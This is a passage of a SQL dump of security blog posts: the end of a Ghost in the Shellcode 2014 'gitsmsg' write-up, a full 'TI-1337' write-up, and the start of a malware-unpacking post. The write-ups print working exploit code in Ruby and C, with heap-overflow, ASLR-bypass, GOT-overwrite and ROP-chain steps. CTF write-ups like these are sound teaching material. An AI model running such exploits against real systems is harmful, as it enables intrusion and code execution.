= TCPSocket.new(\"192.168.1.119\", 8585)\r\n 2 \r\n 3 receive_code(s, 0x00001000, \"init\")\r\n 4 \r\n 5 login(s)\r\n 6 \r\n 7 store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4141414141414141] * 10)\r\n 8 result = get(s, 0)\r\n 9 \r\n10 Hex.print(result)\r\n\nEverything will be normal and it\'ll output:\n\r\n0000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n0010  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n0020  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n0030  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n0040  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n\nGreat! Now let\'s allocate a int32 array, right after the double array:\n\r\n...\r\n1 store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4141414141414141] * 10)\r\n2 store(s, VARDATA_TYPE_INT_ARRAY, [0x42424242] * 2)\r\n3 Hex.print(get(s, 1))\r\n4 Hex.print(get(s, 0))\r\n\nWe get this output:\n\r\n2 0000  41 41 41 41 41 41 41 41 41 41 41 41 19 04 00 00   AAAAAAAAAAAA....\r\n3 0010  01 00 00 00 14 00 00 00 48 28 00 B8 02 00 00 00   ........H(......\r\n4 0020  41 41 41 41 41 41 41 41 41 41 00 41 41 41 41 41   AAAAAAAAAA.AAAAA\r\n5 0030  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n6 0040  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41   AAAAAAAAAAAAAAAA\r\n7 Length: 0x50 (80)\r\n8 0000  42 42 42 42 42 42 42 42                           BBBBBBBB\r\n9 Length: 0x8 (8)\r\n\nWoah, what\'s going on here!?\nWhat we\'re actually seeing is the first 0x0c (12) bytes of the double array that we created, printing out as normal (a bunch of \'A\'s), followed by the Heap header of the next message! The first array thinks it has 80 bytes to itself, and uses/displays all of them, when in reality it only actually has about 12 bytes (we only allocated 8 bytes, but rounding happens). The remaining 68 bytes are still in the heap\'s pool, and are completely fair game to be allocted. Then, when the second array is allocated, it takes up those bytes.\nIn other words, we have memory that looks like this:\n\r\n------------------------------------------------------------------------------------------------------\r\n|                                  Unallocated..........                                             |\r\n------------------------------------------------------------------------------------------------------\r\n|  [empty memory]                                                                                    |\r\n------------------------------------------------------------------------------------------------------\r\n\nThe first array is stored in allocated memory. First, the message metadata (the type, message-specific data, to, from, filename, next message) is allocated. We\'ll ignore that for now. More importantly, the data buffer is allocated, and it\'s allocated too short!\nThen array requests 8 bytes to store all its data, and gets 12 bytes (because rounding or whatever):\n\r\n------------------------------------------------------------------------------------------------------\r\n|   array1   |                    Unallocated..........                                              |\r\n------------------------------------------------------------------------------------------------------\r\n|  [empty memory]                                                                                    |\r\n------------------------------------------------------------------------------------------------------\r\n\nThe first array thinks it has 80 bytes, and fills it all up\n\r\n------------------------------------------------------------------------------------------------------\r\n|   array1   |                    Unallocated..........                                              |\r\n------------------------------------------------------------------------------------------------------\r\n|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                    |\r\n------------------------------------------------------------------------------------------------------\r\n\nThen along comes array2. Two chunks of memory are allocated for it, as well. The message metadata is allocated first, then a buffer for the message data is allocated. Because the metadata is allocated first, it ends up right after array1, and immediately populates the heap header:\n\r\n------------------------------------------------------------------------------------------------------\r\n|  array1    |                    array2 metadata......                                              |\r\n------------------------------------------------------------------------------------------------------\r\n|AAAAAAAAAAAA\\x19\\x04\\x00\\x00\\x01\\x00\\x00\\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA                    |\r\n------------------------------------------------------------------------------------------------------\r\n\nThen message2 populates its various values, including the type (0x14 = INT_ARRAY), message-specific data (pointer to buffer = 0xb8002848, and length = 0x00000002), and from_username (which, kind of confusingly, I set to all \'A\'s). In the end, the entire rest of array1 is overwritten:\n\r\n------------------------------------------------------------------------------------------------------\r\n|  array1    |                    array2 metadata......                                              |\r\n------------------------------------------------------------------------------------------------------\r\n|AAAAAAAAAAAA\\x19\\x04\\x00\\x00\\x01\\x00\\x00\\x00\\x48\\x28\\x00\\xb8\\x02\\x00\\x00\\x00AAAAAAAAAAAAAAAAAAAAA...|\r\n------------------------------------------------------------------------------------------------------\r\n\nThen, when we displayed it, we saw exactly that.\nThe most interesting part of this is the message-specific data at bytes 0x18 - 0x20 of array2: 0xb8002848 and 0x00000002. They are part of the second array\'s metadata, and are located right smack in the middle of where the first array thinks its data is! And since the first array thinks the memory belongs to it, we can read/write it via the first array. To put it another way, when array1 thinks it\'s editing its own value, it\'s actually editing array2\'s metadata.\nWhat happens if I now edit the first array (the value here, 0xB7FFEC04, is a place where I happen know I\'ll find a static string in memory)?\n\r\nedit(s, 1, 3, [0xB7FFEC04, 10].pack(\"II\"))\r\n\nThen read the second?\n\r\nHex.print(get(s, 0))\r\n\nIt\'s going to dump out whatever happened to be in memory! It\'s truncated to the length I set (10 bytes) multiplied by the element size (and INT_ARRAY has 4-byte elements) for a total length of 40 bytes:\n\r\n1 Length: 0x8 (8)\r\n2 0000  2F 68 6F 6D 65 2F 67 69 74 73 6D 73 67 2F 6D 73   /home/gitsmsg/ms\r\n3 0010  67 73 2F 25 73 2F 25 30 38 78 25 30 38 78 00 00   gs/%s/%08x%08x..\r\n4 0020  55 6E 62 72 65 61 6B 61                           Unbreaka\r\n\nGoing back to the memory layout we looked at before, we saw that the message-specific data (the pointer and the length) overwrote array1:\n\r\n------------------------------------------------------------------------------------------------------\r\n|  array1    |                    array2 metadata......                                              |\r\n------------------------------------------------------------------------------------------------------\r\n|AAAAAAAAAAAA\\x19\\x04\\x00\\x00\\x01\\x00\\x00\\x00\\x48\\x28\\x00\\xb8\\x02\\x00\\x00\\x00AAAAAAAAAAAAAAAAAAAAA...|\r\n------------------------------------------------------------------------------------------------------\r\n\nBut we modified array1 to change those values:\n\r\n------------------------------------------------------------------------------------------------------\r\n|  array1    |                    array2 metadata......                                              |\r\n------------------------------------------------------------------------------------------------------\r\n|AAAAAAAAAAAA\\x19\\x04\\x00\\x00\\x01\\x00\\x00\\x00\\x04\\xec\\xff\\xb7\\x0a\\x00\\x00\\x00AAAAAAAAAAAAAAAAAAAAA...|\r\n------------------------------------------------------------------------------------------------------\r\n\nAnd therefore, when array2 thought it was reading from its own buffer, it was actually reading from the wrong location - 0xB7FFEC04.\n(If we use the edit() function on array2, we can write to that memory as well.)\nThe summary is, we can read and write arbitrary memory, by allocating two arrays, using the first to modify the second\'s metadata, then reading or writing the second\'s data.\nStill with me? I hope so!\nBypassing ASLR\nFor those of you who don\'t know what ASLR is, I recommend reading the Wikipedia page. The summary is, it means that modules and stack don\'t load to the same address twice. So, even though I have an arbitrary read/write memory attack, I don\'t know where memory is, in theory.\nSo how do we find it?\nThe first thing to realize is that the size of the binary in memory doesn\'t change, and the parts within the binary don\'t get re-arranged, so if we can determine where anything in the binary gets loaded, we can use clever math to figure out where everything gets loaded. We just have to leak a single address.\nHow do we leak a single address? It turns out, with the read-memory attack we just saw, this is rather easy. We allocate a double array, as usual, which will get overwritten by the next allocation:\n\r\n1 store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4141414141414141] * 10)\r\n\nThen we allocate a static string, which will overwrite the latter part of the double array:\n\r\n1 store(s, VARDATA_TYPE_STRING, 0)\r\n\nAs I\'ve mentioned before, the strings are indexes into a hardcoded list of strings. Therefore, the address of a static string in the binary will be saved in the message-specific data.\nNow, if we print out the double array:\n\r\n1 Hex.print(get(s, 1))\r\n\nWe get the address of the first such string:\n\r\n1 0000  41 41 41 41 41 41 41 41 41 41 41 41 19 04 00 00   AAAAAAAAAAAA....\r\n2 0010  01 00 00 00 16 00 00 00 B0 EB FF B7 00 00 00 00   ................\r\n3 ...\r\n\nwhich is 0xb7ffebb0, in this case. I know—from the disassembled code—that this value is always 0x2bb0 bytes from the start of the binary, so I can calculate that the base address is 0xb7ffebb0 - 0x2bb0, or at address 0xb7ffc000 on this particular execution. From now on, I can base every address on that.\nAnd thus, ASLR has been bypassed for the binary. But not, sadly, for the stack. I couldn\'t find any way to leak a useful stack address.\nControlling EIP\nUp till now, every writeup I\'ve read has taken essentially the same steps, although they don\'t go through them in as much detail as me (I love writing :) ). However, this is where paths diverge, and no two people have taken the same one.\nThe most obvious solution to controlling EIP is to overwrite the global offset table, which is the same as the solution to TI-1337. But, after a lot of mysterious crashing and debugging, I found out what RELRO means: it means that the relocations are re-mapped as read-only after they are filled in. The .dtor section (destructors) are likewise mapped as read-only. Crap!\nI spent a long, long time trying to figure out what to overwrite. Can I cause path traversal? Can anything in the .data section cause an overflow? Can I read a stack address from anywhere in known memory? etc. etc., but no dice.\nEventually, I realized that I could read large chunks of memory, so why don\'t I read the entire space where the stack might be? Experimentally, I determined that, at least on my system, the stack was always between 0xBF800000 and 0xBFFFFFFF. With that in mind, I wrote this beast:\n\r\n 1 # This function is kind of an ugly hack, but it works reliably so I can\'t really\r\n 2 # complain.\r\n 3 #\r\n 4 # It basically searches a large chunk of memory for a specific return address.\r\n 5 # When it finds that address, it returns there.\r\n 6 def find_return_address(s, base_addr)\r\n 7   address_to_find = [base_addr + MAIN_RETURN_ADDRESS].pack(\"I\")\r\n 8 \r\n 9   # Store an array of doubles. This will overlap the next allocation\r\n10   store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)\r\n11 \r\n12   # Store an array of bytes. We\'ll be able to change the length and locatino\r\n13   # of this buffer in order to read arbitrary memory\r\n14   store(s, VARDATA_TYPE_BYTE_ARRAY, [0x41])\r\n15 \r\n16   # Overwrite the location and size of the byte array. The location will be\r\n17   # set to STACK_MIN, and the size will be set to STACK_MAX - STACK_MIN\r\n18   edit(s, 1, 3, [STACK_MIN, (STACK_MAX - STACK_MIN)].pack(\"II\"))\r\n19   puts(\"Reading the stack (0x%08x - 0x%08x)...\" % [STACK_MIN, STACK_MAX])\r\n20 \r\n21   # We have to re-implement \"get\" here, so we can handle a large buffer and\r\n22   # so we can quit when we find what we need\r\n23   out = [MESSAGE_GET, 0].pack(\"II\")\r\n24   s.write(out)\r\n25   get_int(s) # type (don\'t care)\r\n26   len = get_int(s)\r\n27   result = \"\"\r\n28 \r\n29   # Loop and read till we either reach the end, of we find the value we need\r\n30   while(result.length < len)\r\n31     result = result + s.recv(STACK_MAX - STACK_MIN + 1)\r\n32 \r\n33     # As soon as we find the location, end\r\n34     if(loc = result.index(address_to_find))\r\n35       return STACK_MIN + loc\r\n36     end\r\n37   end\r\n38 \r\n39   # D\'awww :(\r\n40   puts(\"Couldn\'t find the return address :(\")\r\n41   exit\r\n42 end\r\n\nIt uses the exact same technique as we initially used to read that static string from memory, except instead of reading 20 or 30 bytes, it reads 0x7fffff—that\'s about 8 megabytes.\nSomewhere in that chunk of memory will be the actual stack. And somewhere on the stack will be the return address of the main looping function. And, fortunately, because I can capture the base address of the binary (outlined last section), I know exactly what that address will be!\nTo put it another way: I know that the main loop returns to an address when it\'s done. I can calculate that address, and therefore I know the absolute return address of the main loop. If I know it, it means I can find it on the stack. And if I can find it on the stack, it means I can change it.\nHere\'s some code that finds the address and changes it:\n\r\n 1 # Set up the connection\r\n 2 s = TCPSocket.new(\"192.168.1.119\", 8585)\r\n 3 receive_code(s, 0x00001000, \"init\")\r\n 4 login(s)\r\n 5 \r\n 6 # Get the base address\r\n 7 base_addr = get_base_address(s)\r\n 8 \r\n 9 # Get the return address\r\n10 return_address = find_return_address(s, base_addr)\r\n11 \r\n12 # Do a typical overwrite - overwrite the main loop\'s return address\r\n13 # with 0x43434343\r\n14 store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x4141414141414141] * 10)\r\n15 store(s, VARDATA_TYPE_INT_ARRAY, [0x42424242])\r\n16 edit(s, 1, 3, [return_address, 1].pack(\"II\"))\r\n17 edit(s, 0, 0, [0x43434343].pack(\"I\"))\r\n18 \r\n19 # Cause the main loop to return\r\n20 quit(s)\r\n\nCan you guess what happens to the server?\n\r\nProgram received signal SIGSEGV, Segmentation fault.\r\n0x43434343 in ?? ()\r\n\nYup, EIP control.\nTo summarize: reading the entire stack is hacky, and I doubt it will work on a 64-bit system, but it worked great in this case!\nAside: Stashing data\nIt\'s really easy to stash data and get the address back. I\'m going to want to open and read a file, later, so I need a way to stash the file and reference it later. This documented code should explain everything:\n\r\n# Store a series of bytes in memory, and return the absolute address\r\n# to where in memory those bytes are stored\r\ndef stash_data(s, data)\r\n  # Store an array of doubles - this will allocate 4 bytes and overwrite 32\r\n  store(s, VARDATA_TYPE_DOUBLE_ARRAY, [0x5e5e5e5e5e5e5e5e] * 4)\r\n\r\n  # Store an array of bytes, which are the data. It will allocate a buffer\r\n  # in which to store these bytes, a pointer to which is written over the\r\n  # previous entry\r\n  store(s, VARDATA_TYPE_BYTE_ARRAY, data.bytes.to_a)\r\n\r\n  # Get bytes 24 - 27 of the double array, which is where a pointer to the\r\n  # allocated buffer (containing \'data\') will be stored\r\n  result = get(s, 1)[24..27].unpack(\"I\").pop\r\n\r\n  puts(\"\'%s\' stored at 0x%08x\" % [data, result])\r\n\r\n  return result\r\nend\r\n\nGetting execution\nSo, I got this all working, and immediately stashed some simple shellcode and jumped to it. And it crashed. That means that data execution prevention—DEP—is enabled, so I can only execute code from +x sections of memory. I know how to do that fairly easily, but it was a kick in the face after all that work. Just make this easy on me, guys! :)\nThis isn\'t going to teach you how to write a ROP payload (one of my past CTF blogs will teach you in great detail!). But let me tell you: once you do this a couple times, it actually gets really easy!\nAnother aside: helpful hint on testing your exploit\nSuper helpful hint: the first thing I did after realizing that DEP was enabled was jump to base_addr+0x2350, which looks like this:\n\r\n.text:B7FFE350\r\n.text:B7FFE350 handle_packet_00000009_quit:            ; CODE XREF: do_client_stuff+71j\r\n.text:B7FFE350                                         ; DATA XREF: do_client_stuff:off_B7FFE324o\r\n.text:B7FFE350                 mov     [esp+2Ch+out_arg_0], 1003h ; packet 9 returns the integer 0x00001003 then exits\r\n.text:B7FFE357                 call    send_int\r\n.text:B7FFE35C\r\n.text:B7FFE35C loc_B7FFE35C:                           ; CODE XREF: do_client_stuff+5Bj\r\n.text:B7FFE35C                 add     esp, 20h\r\n.text:B7FFE35F                 xor     eax, eax\r\n.text:B7FFE361                 pop     ebx\r\n.text:B7FFE362                 pop     esi\r\n.text:B7FFE363                 pop     edi\r\n.text:B7FFE364                 retn\r\n\nIt sends out the integer 0x1003, then attempts to return (and probably crashes). But getting that 0x1003 back from the socket after writing this was exactly the push I needed to keep going: I knew my EIP-control was working. Besides returning into known-good code like that, the shellcode eb fe (jmp -2) and cd 03 (debug breakpoint) are fantastic ways to debug exploits. The former never returns, and the latter crashes immediately (and gives you debug control if it\'s local). It\'s the perfect way to test if your code is actually being run!\nBack to our originally scheduled program...\nAll right, let\'s look at our ROP chain!\n\r\n# This generates the ROP stack. It\'s a simple open + read + write. The\r\n# only thing I\'m not proud of here is that I make an assumption about what\r\n# the file handle will be after the open() call - but it seems to reliably\r\n# be \'1\' in my testing\r\ndef get_rop(file_path, base_addr, fd)\r\n    stack = [\r\n      # open(filename, 0)\r\n      base_addr + OPEN,  # open()\r\n      base_addr + PPR,   # pop/pop/ret\r\n      file_path,         # filename = value we created\r\n      0,                 # flags\r\n\r\n      # read(fd, filename, 100) # We\'re re-using the filename as a buffer\r\n      base_addr + READ,  # read()\r\n      base_addr + PPPR,  # pop/pop/pop/ret\r\n      0,                 # fd - Because all descriptors are closed, the first available descriptor is \'0\'\r\n      file_path,         # buf\r\n      100,               # count\r\n\r\n      # write(fd, filename, 0)\r\n      base_addr + WRITE, # write()\r\n      base_addr + PPPR,  # pop/pop/pop/ret\r\n      fd,                # fd\r\n      file_path,         # buf\r\n      100,               # count\r\n\r\n      # This was simply for testing, it sends 4 bytes then exits\r\n      #base_addr + 0x2350\r\n    ]\r\n\r\n    return stack\r\nend\r\n\nOnce again, this is fairly simple!\nWe open a file. The file_path is something we stashed earlier, and is \"/home/gitsmsg/key\". We return to a pop/pop/ret to clean the two arguments off the stack.\nWe read up to 100 bytes from the file into the place where we stashed the filename (since it\'s handy and writeable). We use the file handle 0, because that\'s the handle that\'s always used (all the handles are closed in the child process, and the syscall promises to use the lowest un-used handle). Hardcoding the file handle was ugly, but way easier than actually figuring it out.\nWe write up to 100 bytes from that buffer back to the main file descriptor of the connection—that is, back to the socket that I\'m communicating through. This descriptor was obtained by reading the right place in memory.\nIt\'s simple, but it works! And if all goes according to plan, here\'s the exploit running:\n\r\n$ ruby sploit.rb\r\n** Initializing\r\n** Logging in\r\n** Stashing a path to the file on the heap\r\n\'/home/gitsmsg/key\' stored at 0xb8c2f848\r\n** Using a memory leak to get the base address [ASLR Bypass]\r\n... found it @ 0xb77dd000!\r\n** Reading the file descriptor from memory\r\n... it\'s 4!\r\n** Searching stack memory for the return address [Another ASLR Bypass]\r\nReading the stack (0xbf800000 - 0xbfffffff)...\r\n... found it @ 0xbfd0546c\r\n** Generating the ROP chain [DEP Bypass]\r\n** Writing the ROP chain to the stack\r\n** Sending a \'quit\' message, to trigger the payload\r\n** Crossing our fingers and waiting for the password\r\nThe key is: lol, tagged unions for the WIN!\r\n\nw00t! Full exploit is here.\nConclusion\nFor those of you who are counting, this is a heap overflow with ASLR, DEP, stack cookies, RELRO, and safe heap unlinking. We bypass some of those, and just ignore others that don\'t apply, to run arbitrary code 100% reliably. I\'m proud to say, it\'s the most difficult exploit I\'ve ever written, and I\'m thrilled I could share it with everybody!', '\'GITS2014\', \'Hacking\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-gitsmsg-pwnage-299');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (31, 'Ghost in the Shellcode: TI-1337 (Pwnable 100)', 'Ron Bowes', '2014-1-24', 'Hey everybody,\nThis past weekend was Shmoocon, and you know what that means—Ghost in the Shellcode!\nMost years I go to Shmoocon, but this year I couldn\'t attend, so I did the next best thing: competed in Ghost in the Shellcode! This year, our rag-tag band of misfits—that is, the team who purposely decided not to ever decide on a team name, mainly to avoid getting competitive—managed to get 20th place out of at least 300 scoring teams!\nI personally solved three levels: TI-1337, gitsmsg, and fuzzy. This is the first of three writeups, for the easiest of the three: TI-1337—solved by 44 teams.\nYou can download the binary, as well as the exploit, the IDA Pro files, and everything else worth keeping that I generated, from my Github repository.\n\nGetting started\nUnlike some of my teammates, I like to dive head-first into assembly, and try not to drown. So I fired up IDA Pro to see what was going on, and I immediately noticed is that it\'s a 64-bit Linux binary, and doesn\'t have a ton of code. Having never in my life written a 64-bit exploit, this would be an adventure!\nSmall aside: Fork this!\nI\'d like to take a quick moment to show you a trick I use to solve just about every Pwn-style CTF level: getting past that pesky fork(). Have you ever been trying to debug a vuln in a forking program? You attach  a debugger, it forks, it crashes, and you never know. So you go back, you set affinity to \'child\', you debug, the debugger follows the child, catches the crash, and the socket doesn\'t get cleaned up properly? It\'s awful! There is probably a much better way to do this, but this is what I do.\nFirst, I load the binary into IDA and look for the fork() call:\n\r\n.text:00400F65                         good_connection:                        ; CODE XREF: do_connection_stuff+39j\r\n.text:00400F65 E8 06 FD FF FF     call    _fork\r\n.text:00400F6A 89 45 F4           mov     [rbp+child_pid], eax\r\n.text:00400F6D 83 7D F4 FF        cmp     [rbp+child_pid], 0FFFFFFFFh\r\n.text:00400F71 75 02              jnz     short fork_successful\r\n\nYou\'ll note that opcode bytes are turned on, so I can see the hex-encoded machine code along with the instruction. The call to fork() has the corresponding code e8 06 fd ff ff. That\'s what I want to get rid of.\nSo, I open the binary in a hex editor, such as \'xvi32.exe\', search for that sequence of bytes (and perhaps some surrounding bytes, if it\'s ambiguous), and replace it with 31 c0 90 90 90. The first two bytes—31 c0—is \"xor eax, eax\" (ie, clear eax), and 90 90 90 is \"nop / nop / nop\". So basically, the function does nothing and returns 0 (ie, behaves as if it\'s the child process).\nYou may want to kill the call to alarm(), as well, which will kill the process if you spend more than 30 seconds looking at it. You can replace that call with 90 90 90 90 90—it doesn\'t matter what it returns.\nI did this on all three levels, and I renamed the new executable \"<name>-fixed\". You\'ll find them in the Github repository. I\'m not going to go over that again in the next two posts, but I\'ll be referring back to this instead.\nThe program\nSince this is a post on exploitation, not reverse engineering, I\'m not going to go super in-depth into the code. Instead, I\'ll describe it at a higher level and let you delve in more deeply if you\'re interested.\nThe main handle_connection() function can be found at offset 0x00401567. It immediately jumps to the bottom, which is a common optimization for a \'for\' or \'while\' loop, where it calls the code responsible for receiving data—the function at 0x00401395. After receiving data, it jumps back to the top of handle_connection() function, just after the jump to the bottom, where it goes through a big if/else list, looking for a bunch of symbols (like \'+\', \'-\', \'/\' and \'*\'—look familiar?)\nAfter the if/else list, it goes back to the receive function, then to the top of the loop, and so on. Receive, parse, receive, parse, etc. Let\'s look at those two pieces separately, then we\'ll explore the vulnerability and see the exploit.\nReceive\nAs I mentioned above, the receive function starts at 0x00401395.\nThis function starts by reading up to 0x100 (256) bytes from the socket, ending at a newline (0x0a) if it finds one. This is done using a simple receive-loop function located at 0x0040130E that is worthwhile going through, if you\'re new to this, but that doesn\'t add much to the exploit.\nAfter reading the input, it\'s passed to sscanf(buffer, \"%lg\", ...). The format string \"%lg\" tells sscanf() to parse the input as a \"double\" variable—a 64-bit floating point. Great: a x64 process handling floating point values; that\'s two things I don\'t know!\nIf the sscanf() fails—that is, the received data isn\'t a valid-looking floating point value—the received data is copied wholesale into the buffer. A flag at the start of the buffer is set indicating whether or not the double was parsed.\nThen the function returns. Quite simple!\nProcessing the data\nI mentioned earlier that this binary looks for mathematical symbols—\'+\', \'-\', \'*\', \'/\' in the received data. I didn\'t actually notice that right away, nor did the name \"TI-1337\" (or the fact that it used port \"31415\"... think about it) lead me to believe this might be a calculator. I\'m not the sharpest pencil sometimes, but I try hard!\nAnyway, back to the main parsing code (near the top of the function at 0x00401567 again)! The parsing code is actually divided into two parts: a short piece of code that runs if a valid double was received (ie, the sscanf() worked), and a longer one that runs if it wasn\'t a double. The short piece of code simply calls a function (spoiler alert: the function pushes it onto a global stack object they use, not to be confused with the runtime stack). The longer one performs a bunch of string comparisons and does soemthing based on those.\nI think at this point I\'ll give away the trick: whole application is a stack-based calculator. It allocates a large chunk of memory as a global variable, and implements a stack (a length followed by a series of 64-bit values). If you enter a double, it\'s pushed onto the stack and the length is incremented. If you enter one of a few symbols, it pops one or more values (without checking if we\'re at the beginning!), updates the length, and performs the calculation. The new value is then pushed back on top of the stack.\nHere\'s an example session:\n\r\n(sent) 10\r\n(sent) 20\r\n(sent) +\r\n(sent) .\r\n(received) 30\r\n\nAnd a list of all possible symbols:\n\n+ :: pops the top two elements off the stack, adds them, pushes the result\n- :: same as \'+\', except it subtracts\n* :: likewise, multiplication\n/ :: and, to round it out, division\n^ :: exponents\n! :: I never really figured this one out, might be a bitwise negation (or might not, it uses some heavy floating point opcodes that I didn\'t research :) )\n. :: display the current value\nb :: display the current value, and pop it\nq :: quit the program\nc :: clear the stack\n\nAnd, quite honestly, that\'s about it! That\'s how it works, let\'s see how to break it!\nThe vulnerability\nAs I alluded to earlier, the program fails to check where on the stack it currently is when it pops a value. That means, if you pop a value when there\'s nothing on the stack, you wind up with a buffer underflow. Oops! That means that if we pop a bunch of times then push, it\'s going to overwrite something before the beginning of the stack.\nSo where is the stack? If you look at the code in IDA, you\'ll find that the stack starts at 0x00603140—the .bss section. If you scroll up, before long you\'ll find this:\n\r\n.got.plt:00603018 off_603018      dq offset free          ; DATA XREF: _freer\r\n.got.plt:00603020 off_603020      dq offset recv          ; DATA XREF: _recvr\r\n.got.plt:00603028 off_603028      dq offset strncpy       ; DATA XREF: _strncpyr\r\n.got.plt:00603030 off_603030      dq offset setsockopt    ; DATA XREF: _setsockoptr\r\n...\r\n\nThe global offset table! And it\'s readable/writeable!\nIf we pop a couple dozen times, then push a value of our choice, we can overwrite any entry—or all entries—with any value we want!\nThat just leaves one last step: where to put the shellcode?\nAside: floating point\nOne gotcha that\'s probably uninteresting, but is also the reason that this level took me significantly longer than it should have—the only thing you can push/pop on the application\'s stack is 64-bit double values! They\'re read using \"%lg\", but if I print stuff out using printf(\"%lg\", address), it would truncate the numbers! Boo!\nAfter some googling, I discovered that you had to raise printf\'s precision a whole bunch to reproduce the full 64-bit value as a decimal number. I decided that 127 decimal places was more than enough (probably like 5x too much, but I don\'t even care) to get a good result, so I used this to convert a series of 8 bytes to a unique double:\n\r\n  sprintf(buf, \"%.127lg\\n\", d);                                \r\n\nI incorporated that into my push() function:\n\r\n/* This pushes an 8-byte value onto the server\'s stack. */\r\nvoid do_push(int s, char *value)\r\n{\r\n  char buf[1024];\r\n  double d;\r\n\r\n  /* Convert the value to a double */\r\n  memcpy(&d, value, 8);\r\n\r\n  /* Turn the double into a string */\r\n  sprintf(buf, \"%.127lg\\n\", d);\r\n  printf(\"Pushing %s\", buf);\r\n\r\n  /* Send it */\r\n  if(send(s, buf, strlen(buf), 0) != strlen(buf))\r\n    perror(\"send error!\");\r\n}\r\n\nAnd it worked perfectly!\nThe exploit\nWell, we have a stack (one again, not to be confused with the program\'s stack) where we can put shellcode. It has a static memory address and is user-controllable. We also have a way to encode the shellcode (and addresses) so we wind up with fully controlled values on the stack. Let\'s write an exploit!\nHere\'s the bulk of the exploit:\n\r\nint main(int argc, const char *argv[])\r\n{\r\n  char buf[1024];\r\n  int i;\r\n\r\n  int s = get_socket();\r\n\r\n  /* Load the shellcode */\r\n  for(i = 0; i < strlen(shellcode); i += 8)\r\n    do_push(s, shellcode + i);\r\n  /* Pop the shellcode (in retrospect, this could be replaced with a single \'c\') */\r\n  for(i = 0; i < strlen(shellcode); i += 8)\r\n    do_pop(s);\r\n\r\n  /* Pop until we\'re at the recv() call */\r\n  for(i = 0; i < 38; i++)\r\n    do_pop(s);\r\n\r\n  do_push(s, TARGET);\r\n\r\n  /* Send a \'.\' just so I can catch it */\r\n  sprintf(buf, \".\\n\");\r\n  send(s, buf, strlen(buf), 0);\r\n\r\n  sleep(100);\r\n\r\n  return 0;\r\n}\r\n\nYou can find the full exploit here!\nConclusion\nAnd that\'s all there is to it! Just push the shellcode on the stack, pop our way back to the .got.plt section, and push the address of the stack. Bam! Execution!\nThat\'s all for now, stay tuned for the much more difficult levels: gitsmsg and fuzzy!', '\'GITS2014\', \'Hacking\', \'Reverse Engineering\'', 'https://blog.skullsecurity.org/2014/ghost-in-the-shellcode-ti-1337-pwnable-100');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (32, 'In-depth malware: Unpacking the ‘lcmw’ Trojan', 'Ron Bowes', '2014-1-2', 'Hey folks,\nHappy New Year, and welcome to 2014!\nOn a recent trip to Tyson\'s Corner, VA, I had some time to kill, so I took a careful look at a malware sample that a friend of mine sent to me some time ago, which I believe he originally got off somebody else\'s hosed system. The plan was for me to investigate it, and I promised him I would; it just took awhile!\nAnyways, the sample has a few layers of packing, and I thought it\'d be fun/interesting to show you how to unwrap the entire thing to obtain the final payload. I am not going to discuss the payload itself in this post, largely because I haven\'t spent much time reversing it. Perhaps in the future I\'ll dig a little deeper, but for now we\'ll focus on the packing.\nI called this sample \"lcmw\". It stood for something interesting, but I don\'t really remember what—I may have been drinking when I named it. :)\n\nYou can find my IDA .idb files and my notes on Github, and samples on my downloads page. WARNING: This is malware! Only run it in a highly controlled environment!! I don\'t know what the final payload does, so if you run it, it\'s at your own risk! Use a virtual machine, don\'t connect it to the Internet, etc. Be careful!\n(The password is \'infected\')\nFun fact: my ISP got an abuse@ email because I was originally hosting the malware file without putting it in a .zip file:\nDear abuse team,\r\n\r\nplease help to close these offending viruses sites(1) so far.\r\n\r\nstatus: As of 2013-11-29 12:51:30 CET\r\n[2]http://support.clean-mx.de/clean-mx/viruses.php?email=internet.abuse@noc.vo[..]\r\n\r\n(for full uri, please scroll to the right end ...\r\n\r\nWe detected many active cases dated back to 2007, so please look at the date\r\ncolumn below.\r\nYou may also subscribe to our MalwareWatch list\r\n[3]http://lists.clean-mx.com/cgi-bin/mailman/listinfo/viruswatch\r\n\r\nThis information has been generated out of our comprehensive real time\r\ndatabase,\r\ntracking worldwide viruses URI\'s\r\n\r\nIf your review this list of offending site, please do this carefully, pay\r\nattention for redirects also!\r\nAlso, please consider this particular machines may have a root kit installed !\r\nSo simply deleting some files or dirs or disabling cgi may not really solve\r\nthe\r\nissue !\r\n\nThat was neat. Thanks to my ISP—Voi Network Solutions—laughing about it with me rather than shutting off my connection!\nBackground\nStage1: the time waster\nAll right, if you\'re following along, this file is called \"sample.bin\". The original name was \"hlcumrpi.dat\". But if you run \"file\" on it (on *nix or Cygwin):\n$ file hlcumrpi.dat\nhlcumrpi.dat: PE32 executable (DLL) (GUI) Intel 80386, for MS Windows\nIt\'s technically a .dll library, and is typically run with a \"rundll32.exe\" command on startup. I renamed it to \"sample.bin\", since it\'s easier to remember that way. Fire up IDA, load the file, and have a look at the DllEntryPoint function!\nInitial inspection\n...are you done? Did you get lost in a deep rats\' nest of functions? Because that\'s what this stage is all about—wasting your time. It turns out, there\'s maybe 10 lines that do anything—the rest just burns CPU and, more importantly, reverse engineer cycles.\nTake this sequence for example:\n\r\n.text:004014AE mov ebx, 0FFFFFh\r\n.text:004014B3\r\n.text:004014B3 loc_4014B3: ; CODE XREF: 